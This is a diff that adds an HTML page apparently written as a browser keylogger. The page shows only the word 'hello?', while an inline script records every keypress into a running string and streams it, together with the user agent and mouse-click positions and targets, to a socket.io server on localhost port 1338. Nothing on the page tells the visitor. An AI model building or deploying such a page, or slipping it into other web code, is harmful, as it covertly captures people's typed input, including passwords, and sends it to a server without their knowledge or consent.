@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title></title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+      body {
+        width: 100vw;
+        height: 100vh;
+        overflow: hidden;
+      }
+    </style>
+  </head>
+  <body>
+  <p>
+      hello?
+  </p>
+  <script src="https://unpkg.com/jquery@3.2.1"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.3/socket.io.js"></script>
+  <script defer>
+  // client code below
+  var keylogstr = "";
+  var socket = io('http://localhost:1338');
+
+  socket.emit('info', navigator.userAgent)
+
+  // whenever a keypress is triggered, push the evtinfo to server
+  $('body').keypress(function (event) {
+    var character = String.fromCharCode(event.charCode)
+    keylogstr += character;
+    socket.emit('keypress', keylogstr);
+  });
+
+  // whenever a mouseclick is triggered, push the evtinfo to server
+  $(document).on("click", function(event){
+
+    var output = {};
+    output.x = event.screenX;
+    output.y = event.screenY;
+    output.target = event.target;
+    output.eventType = event.originalEvent;
+
+    socket.emit('mousemove', JSON.stringify(output));
+  });
+
+  </script>
+  </body>
+</html>
